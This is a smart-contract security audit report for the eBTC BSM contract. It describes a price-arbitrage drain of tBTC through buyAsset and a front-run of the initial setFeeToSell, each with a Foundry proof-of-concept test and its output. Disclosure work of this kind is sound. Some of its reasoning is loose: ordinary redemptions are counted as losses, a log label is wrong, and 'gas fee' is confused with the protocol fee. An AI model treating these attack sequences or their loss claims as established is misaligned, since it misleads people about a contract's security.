# **L1** Arbitrage can lead to loss of protocol's funds, through EbtcBSM.sol::buyAsset.

## Summary
Arbitrage can lead to loss of protocol's funds, if price of eBTC and tBTC (asset token) fluctuates sharply.

Consider following case -

1. eBTC trading at a discount let's say $28K compared to it's normal price $30K.
2. users will first buy eBTC cheaply from market and then they will tend to call buyAsset to burn undervalued eBTC.
3. In order to withdraw more valuable tBTC at 1:1 rate.
4. This will lead to situation where tBTC will start depleting rapidly from protocol.
5. leading to detoriation of protocol's asset/liability.

With numerical ex-

1. eBTC market price: $28,000. [Amount = 100 eBTC]
2. tBTC market price: $30,000.
3. Fee to buy assets: 1%.
4. user hits's buyAsset function, burning all 100eBTC
5. user will get 100tBTC - fee, lets say 99tBTC.
6. Loss to protcol = 99tBTC - 100eBTC = 2.97M -2.8M = 0.17 M

## Finding Description
The function flow is as follow -
```js
function buyAsset(
        uint256 _ebtcAmountIn,
        address _recipient,
        uint256 _minOutAmount
    ) external whenNotPaused returns (uint256 _assetAmountOut) {
@>      return _buyAsset(_ebtcAmountIn, _recipient, _feeToBuy(_ebtcAmountIn), _minOutAmount);
    }
function _buyAsset(
        uint256 _ebtcAmountIn,
        address _recipient,
        uint256 _feeAmount,
        uint256 _minOutAmount
    ) internal returns (uint256 _assetAmountOut) {
        if (_ebtcAmountIn == 0) revert ZeroAmount();
        if (_recipient == address(0)) revert InvalidRecipientAddress();

@>      _checkTotalAssetsDeposited(_ebtcAmountIn);

        EBTC_TOKEN.burn(msg.sender, _ebtcAmountIn);

        totalMinted -= _ebtcAmountIn;

        uint256 redeemedAmount = escrow.onWithdraw(
            _ebtcAmountIn
        );

        _assetAmountOut = redeemedAmount - _feeAmount;

        // slippage check
        if (_assetAmountOut < _minOutAmount) {
            revert BelowExpectedMinOutAmount(_minOutAmount, _assetAmountOut);
        }

        if (_assetAmountOut > 0) {
            // INVARIANT: _assetAmountOut <= _ebtcAmountIn
            ASSET_TOKEN.safeTransferFrom(
                address(escrow),
                _recipient,
                _assetAmountOut
            );
        }

        emit AssetBought(_ebtcAmountIn, _assetAmountOut, _feeAmount);
    }
function _checkTotalAssetsDeposited(uint256 amountToBuy) private view {
        // ebtc to asset price is treated as 1 for buyAsset
        uint256 totalAssetsDeposited = escrow.totalAssetsDeposited();
        if (amountToBuy > totalAssetsDeposited) {
            revert InsufficientAssetTokens(amountToBuy, totalAssetsDeposited);
        }
    }
```
Throughout the whole flow, the assetPrice of eBTC or tBTC (asset token) is not taken in consideration. And this approach is wrong.

## Impact Explanation
- This can lead to loss of funds to protocol (asset token drainage).
- Impermanent loss.
## Likelihood Explanation
## Proof of Concept (if required)
The following POC decribes this issue, it does the following.

protocol starts with 5tBTC.
an arbitrageur is created and given 20eBTC tokens (to simulate market condition)
There are 2 arbitarge cycles to simulate market codition, it's assumed that eBTC is trading 10% discount.
1eBTC = 0.9tBTC (market condition).
At end of each cycle the arbitrageur makes some profit.
Paste following POC in `BuyAssetTests.t.sol`
```js
function testBuyAssetFee_missingOracleConstraint() public {
        vm.prank(testMinter);
        bsmTester.sellAsset(5e18, testMinter, 0);
        
        // Settiing buy fee to 1% for calculations
        vm.prank(techOpsMultisig);
        bsmTester.setFeeToBuy(100);
        
        // Setup arbitrageur with market secnaio.
        address arbitrageur = makeAddr("arbitrageur");
        vm.prank(testMinter);
        mockEbtcToken.transfer(arbitrageur, 3e18); // Transfer initial eBTC to arbitrageur
        
        vm.prank(arbitrageur);
        mockEbtcToken.approve(address(bsmTester), type(uint256).max);
        deal(address(mockEbtcToken), arbitrageur, 20e18);
        
        // INITIAL STATE
        uint256 initialProtocolBalance = mockAssetToken.balanceOf(address(escrow));
        console.log("\n=== INITIAL STATE ===");
        console.log("Protocol tBTC balance:", initialProtocolBalance / 1e18);
        console.log("Protocol eBTC obligations:", bsmTester.totalMinted() / 1e18);
        console.log("Arbitrageur eBTC balance:", mockEbtcToken.balanceOf(arbitrageur) / 1e18);
        
        uint256 totalProfit = 0;
        uint256 cycleAmount = 1e18; // Size of each arbitrage cycle
        uint256 marketDiscount = 90; // 90% of face value (10% discount)
        
        // for loop demonstrates 2 arbitarge cycles.
        for (uint i = 0; i < 2; i++) {
            console.log("\n=== ARBITRAGE CYCLE", i+1, "===");
            
            // Calculate market value of eBTC (at discount)
            uint256 marketValueOfInput = (cycleAmount * marketDiscount) / 100;
            
            // Execute arbitrage - redeem eBTC for tBTC
            vm.prank(arbitrageur);
            uint256 assetOut = bsmTester.buyAsset(cycleAmount, arbitrageur, 0);
            
            // Calculate profit on this cycle
            uint256 cycleProfit = assetOut - marketValueOfInput;
            totalProfit += cycleProfit;
            
            console.log("Cycle size:", cycleAmount, "eBTC");
            console.log("Market value paid:", marketValueOfInput, "tBTC equivalent");
            console.log("Redeemed for:", assetOut, "tBTC");
            console.log("Profit this cycle:", cycleProfit, "% of input");
            
            // For next cycle, simulate buying more discounted eBTC on market
            vm.prank(testMinter); 
            mockEbtcToken.transfer(arbitrageur, cycleAmount);
        }
        
        // FINAL STATE
        uint256 finalProtocolBalance = mockAssetToken.balanceOf(address(escrow));
        uint256 protocolLoss = initialProtocolBalance - finalProtocolBalance;
        
        console.log("\n=== FINAL STATE ===");
        console.log("Protocol initial tBTC:", initialProtocolBalance);
        console.log("Protocol remaining tBTC:", finalProtocolBalance);
        console.log("Protocol loss:", protocolLoss, "tBTC");
        console.log("Arbitrageur total profit:", totalProfit, "tBTC");
        
        // ASSET/LIABILITY IMBALANCE
        console.log("Protocol coverage ratio:", (finalProtocolBalance * 100) / bsmTester.totalMinted(), "%");
        
        assertGt(totalProfit, 0, "Arbitrage should be profitable");
        assertGt(protocolLoss, 0, "Protocol should lose assets from arbitrage");
    }
```
Output -
```js
forge test --match-test testBuyAssetFee_missingOracleConstraint -vvv

Ran 1 test for test/BuyAssetTests.t.sol:BuyAssetTests
[PASS] testBuyAssetFee_missingOracleConstraint() (gas: 479081)
Logs:

=== INITIAL STATE ===
  Protocol tBTC balance: 5
  Protocol eBTC obligations: 5
  Arbitrageur eBTC balance: 20

=== ARBITRAGE CYCLE 1 ===
  Cycle size: 1000000000000000000 eBTC
  Market value paid: 900000000000000000 tBTC equivalent
  Redeemed for: 990000000000000000 tBTC
  Profit this cycle: 90000000000000000 % of input

=== ARBITRAGE CYCLE 2 ===
  Cycle size: 1000000000000000000 eBTC
  Market value paid: 900000000000000000 tBTC equivalent
  Redeemed for: 990000000000000000 tBTC
  Profit this cycle: 90000000000000000 % of input

=== FINAL STATE ===
  Protocol initial tBTC: 5000000000000000000
  Protocol remaining tBTC: 3020000000000000000
  Protocol loss: 1980000000000000000 tBTC
  Arbitrageur total profit: 180000000000000000 tBTC
```
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.48ms (2.15ms CPU time)

Ran 1 test suite in 54.98ms (6.48ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
## Recommendation (optional)
Consider market consition as well when buyAsset function is being called, similar to _checkMintingConstraints in sellAsset.

# **I1** A user can frontrun EbtcBSM::setFeeToSell and trade/sellAsset without paying fee.
## Summary
A user can frontrun EbtcBSM::setFeeToSell and trade/sellAsset without paying fee.

## Finding Description
Since, initial feeToSellBPS is set to 0; neither it's being set in constructor. The oonly way feeToSellBPS can be set is via `EbtcBSM::setFeeToSell`.

## Impact Explanation
This will cause loss of funds to protocol, and this could be drastic if the trade volume (_assetAmountIn) is very high.

## Likelihood Explanation
This can occur during initial phase, inshort when feeToSellBPS still not set.

## Proof of Concept (if required)
An attacker sees the setFeeToSell tx in mempool.
Attacker frontruns setFeeToSell by paying higher gas fee and calls bsmTester.sellAsset.
transaction executes without paying any gas fee. Hence loss to protcol.
Paste this poc in SellAssetTests.t.sol.
```js
function testSellAsset_frontrun_setFee() public {
        // SETUP: Initial state - fee is at 0%
        assertEq(bsmTester.feeToSellBPS(), 0);
        
        // Creatng attacker account and funding it
        address attacker = makeAddr("attacker");
        deal(address(mockAssetToken), attacker, 10e18);
        vm.prank(attacker);
        mockAssetToken.approve(address(bsmTester), 10e18);
        
        // Creating a tx object, this will act as tx in mempool. (not processed yet.)
        bytes memory setFeeCalldata = abi.encodeWithSelector(
            bsmTester.setFeeToSell.selector, 
            100
        );
        
        // STEP 2: Attacker sees pending fee change in mempool and frontruns it
        // Before fee change takes effect, attacker submits transaction with higher gas price
        vm.txGasPrice(500 gwei); // Higher gas price to ensure it's mined first
        vm.prank(attacker);
        uint256 ebtcReceived = bsmTester.sellAsset(1.01e18, attacker, 0);
        
        // checking - attacker paid no fees (since transaction was mined before fee change)
        assertEq(ebtcReceived, 1.01e18); // Full amount received (no fee deducted)
        assertEq(mockEbtcToken.balanceOf(attacker), 1.01e18);
        assertEq(escrow.feeProfit(), 0); // No fees collected
        
        // STEP 3: Now the admin's transaction gets mined, to set the fee.
        vm.txGasPrice(100 gwei);
        vm.prank(techOpsMultisig);
        bsmTester.setFeeToSell(100);
        
        // STEP 4: Subsequent user who pays the fee
        address laterUser = makeAddr("laterUser");
        deal(address(mockAssetToken), laterUser, 10e18);
        vm.prank(laterUser);
        mockAssetToken.approve(address(bsmTester), 10e18);
        
        vm.prank(laterUser);
        uint256 laterUserReceived = bsmTester.sellAsset(1.01e18, laterUser, 0);
        
        // checking - Later user pays the 1% fee
        assertEq(laterUserReceived, 1e18); // 1.01e18 - 0.01e18 fee = 1e18 received
        assertEq(escrow.feeProfit(), 0.01e18); // 0.01e18 fee collected
    }
```
Output -
```js
forge test --match-test testSellAsset_frontrun_setFee -vvv
Ran 1 test for test/SellAssetTests.t.sol:SellAssetTests
[PASS] testSellAsset_frontrun_setFee() (gas: 599634)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.05ms (3.03ms CPU time)

Ran 1 test suite in 50.41ms (7.05ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Recommendation (optional)
Set some non-zero value feeToSellBPS in constructor.